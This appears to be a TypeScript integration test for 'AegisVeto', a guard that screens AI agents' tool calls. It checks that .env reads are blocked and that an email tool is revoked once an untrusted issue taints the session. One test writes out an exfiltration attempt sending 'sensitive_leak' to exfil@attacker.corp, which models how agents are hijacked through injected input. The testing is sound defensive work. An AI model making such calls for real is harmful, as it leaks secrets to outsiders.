import path from 'node:path';
import fs from 'node:fs';
import { Client } from '../core/node_modules/@modelcontextprotocol/client/dist/index.mjs';
import { StdioClientTransport } from '../core/node_modules/@modelcontextprotocol/client/dist/stdio.mjs';
import { startServer } from '../core/src/index.js';
import { createAegisGuard } from '../core/src/sdk/guard.js';
import { getDb } from '../core/src/db/schema.js';

function findRepoRoot(): string {
  let curr = process.cwd();
  while (curr !== path.dirname(curr)) {
    if (fs.existsSync(path.join(curr, 'policy.yaml'))) return curr;
    curr = path.dirname(curr);
  }
  return process.cwd();
}

const rootDir = findRepoRoot();
const sandboxDir = path.join(rootDir, 'sandbox');
const proxyScript = path.join(rootDir, 'core', 'src', 'mcp', 'proxy.ts');
const testCommsScript = path.join(rootDir, 'core', 'src', 'mcp', 'test-comms-server.ts');
const tsxCli = path.join(rootDir, 'core', 'node_modules', 'tsx', 'dist', 'cli.mjs');
const filesystemServerEntry = path.join(
  rootDir,
  'core',
  'node_modules',
  '@modelcontextprotocol',
  'server-filesystem',
  'dist',
  'index.js'
);

async function testFilesystemProxy() {
  console.log('\n[1/3] Testing CLI stdio proxy wrapping @modelcontextprotocol/server-filesystem...');

  const transport = new StdioClientTransport({
    command: process.execPath,
    args: [
      tsxCli,
      proxyScript,
      '--agent',
      'local-dev-agent',
      '--upstream',
      'local-filesystem',
      '--',
      process.execPath,
      filesystemServerEntry,
      sandboxDir,
    ],
  });

  const client = new Client(
    { name: 'test-fs-client', version: '1.0.0' },
    { capabilities: {} }
  );

  await client.connect(transport);

  // Check 1: read_file on README.md (ALLOWED)
  console.log('  -> Calling read_file on README.md (should be ALLOWED)...');
  const readmeRes: any = await client.callTool({
    name: 'read_file',
    arguments: { path: 'README.md' },
  });
  const readmeText = readmeRes?.content?.[0]?.text || '';
  if (!readmeText.includes('Billing Service') && !readmeText.includes('Sandbox') && readmeText.length === 0) {
    throw new Error(`Unexpected README content: ${readmeText}`);
  }
  console.log('  ✓ PASS: read_file on README.md permitted through Layer 1');

  // Check 2: read_file on .env (BLOCKED)
  console.log('  -> Calling read_file on .env (should be BLOCKED by secret protection)...');
  let envBlocked = false;
  try {
    await client.callTool({
      name: 'read_file',
      arguments: { path: '.env' },
    });
  } catch (err: any) {
    envBlocked = true;
    console.log(`  ✓ PASS: read_file on .env blocked: ${err.message}`);
  }

  if (!envBlocked) {
    throw new Error('FAIL: read_file on .env was allowed, expected Layer 1 DENY');
  }

  await client.close();
}

async function testCommsServerProxy() {
  console.log('\n[2/3] Testing CLI stdio proxy wrapping test-comms-server (Taint Lattice & Dynamic Revocation)...');

  const transport = new StdioClientTransport({
    command: process.execPath,
    args: [
      tsxCli,
      proxyScript,
      '--agent',
      'local-dev-agent',
      '--upstream',
      'external-comms',
      '--',
      process.execPath,
      tsxCli,
      testCommsScript,
    ],
  });

  const client = new Client(
    { name: 'test-comms-client', version: '1.0.0' },
    { capabilities: {} }
  );

  let listChangedEmitted = false;
  client.setNotificationHandler('notifications/tools/list_changed', () => {
    listChangedEmitted = true;
    console.log('  -> Received notifications/tools/list_changed from proxy');
  });

  await client.connect(transport);

  // Initial list should show both tools
  const initialTools = await client.listTools();
  const initialNames = (initialTools.tools || []).map((t: any) => t.name);
  console.log('  Initial tools exposed:', initialNames);
  if (!initialNames.includes('read_public_issue') || !initialNames.includes('send_external_email')) {
    throw new Error(`Expected both read_public_issue and send_external_email, got: ${initialNames.join(', ')}`);
  }

  // Calling untrusted tool read_public_issue
  console.log('  -> Calling read_public_issue (untrusted input source)...');
  const issueRes: any = await client.callTool({
    name: 'read_public_issue',
    arguments: {},
  });
  console.log('  read_public_issue returned content length:', (issueRes?.content?.[0]?.text || '').length);

  // Wait briefly for notification dispatch
  await new Promise((r) => setTimeout(r, 200));

  if (!listChangedEmitted) {
    throw new Error('FAIL: notifications/tools/list_changed was not emitted upon session taint');
  }
  console.log('  ✓ PASS: notifications/tools/list_changed received upon taint transition');

  // Query tools/list again: egress tool must be revoked/hidden
  const postTaintTools = await client.listTools();
  const postTaintNames = (postTaintTools.tools || []).map((t: any) => t.name);
  console.log('  Post-taint tools exposed:', postTaintNames);
  if (postTaintNames.includes('send_external_email')) {
    throw new Error('FAIL: send_external_email was not revoked from tools/list after session became TAINTED');
  }
  console.log('  ✓ PASS: send_external_email successfully revoked from tools/list');

  // Calling egress tool directly must be blocked by Taint Lock
  console.log('  -> Attempting direct call to send_external_email (should be blocked by Taint Lock)...');
  let emailBlocked = false;
  try {
    await client.callTool({
      name: 'send_external_email',
      arguments: { to: 'exfil@attacker.corp', body: 'sensitive_leak' },
    });
  } catch (err: any) {
    emailBlocked = true;
    console.log(`  ✓ PASS: Direct call to send_external_email blocked: ${err.message}`);
  }

  if (!emailBlocked) {
    throw new Error('FAIL: Direct call to send_external_email was allowed when TAINTED');
  }

  await client.close();
}

async function testSdkGuard() {
  console.log('\n[3/3] Testing In-Process SDK Guard (createAegisGuard) in Enforce vs Shadow mode...');

  const TEST_PORT = 3099;
  let serverInstance: any;

  try {
    serverInstance = await startServer(TEST_PORT);
  } catch (err: any) {
    if (!err.message?.includes('EADDRINUSE')) throw err;
  }

  // Ensure shadow agent exists in SQLite
  const db = getDb();
  db.prepare(`
    INSERT OR REPLACE INTO agents (id, name, mode, allowed_upstreams_json, status, created_at)
    VALUES (?, ?, 'shadow', '["*"]', 'active', ?)
  `).run('shadow-test-agent', 'Shadow Mode Test Agent', new Date().toISOString());

  // 1. Enforce mode test
  console.log('  -> Testing enforce mode (local-dev-agent)...');
  const enforceGuard = createAegisGuard({
    baseUrl: `http://127.0.0.1:${TEST_PORT}`,
    agentId: 'local-dev-agent',
  });

  let enforceExecutorRan = false;
  const enforceRes = await enforceGuard.guardToolCall(
    'sess_sdk_enforce',
    'read_file',
    { path: 'sandbox/.env' },
    async () => {
      enforceExecutorRan = true;
      return 'secret_env_data';
    }
  );

  if (enforceExecutorRan || enforceRes.allowed) {
    throw new Error('FAIL: Enforce mode allowed malicious tool call');
  }
  console.log(`  ✓ PASS: Enforce mode blocked tool call (${enforceRes.verdict}) without running executor`);

  // 2. Shadow mode test
  console.log('  -> Testing shadow mode (shadow-test-agent)...');
  const shadowGuard = createAegisGuard({
    baseUrl: `http://127.0.0.1:${TEST_PORT}`,
    agentId: 'shadow-test-agent',
  });

  let shadowExecutorRan = false;
  const shadowRes = await shadowGuard.guardToolCall(
    'sess_sdk_shadow',
    'read_file',
    { path: 'sandbox/.env' },
    async () => {
      shadowExecutorRan = true;
      return 'shadow_success_data';
    }
  );

  if (!shadowExecutorRan || !shadowRes.allowed || shadowRes.verdict !== 'SHADOW_DENY') {
    throw new Error(`FAIL: Shadow mode expected SHADOW_DENY and allowed=true, got verdict=${shadowRes.verdict}, allowed=${shadowRes.allowed}`);
  }
  console.log(`  ✓ PASS: Shadow mode recorded SHADOW_DENY and safely permitted execution (result=${shadowRes.result})`);

  if (serverInstance?.close) {
    serverInstance.close();
  }
}

async function runDataPlaneTests() {
  console.log('=====================================================');
  console.log('  AegisVeto Production Data Plane Integration Suite  ');
  console.log('=====================================================');

  await testFilesystemProxy();
  await testCommsServerProxy();
  await testSdkGuard();

  console.log('\n=====================================================');
  console.log('  ✓ ALL PRODUCTION DATA PLANE INTEGRATION TESTS PASSED');
  console.log('=====================================================\n');
  process.exit(0);
}

runDataPlaneTests().catch((err) => {
  console.error('\n❌ INTEGRATION TEST FAILED:', err);
  process.exit(1);
});
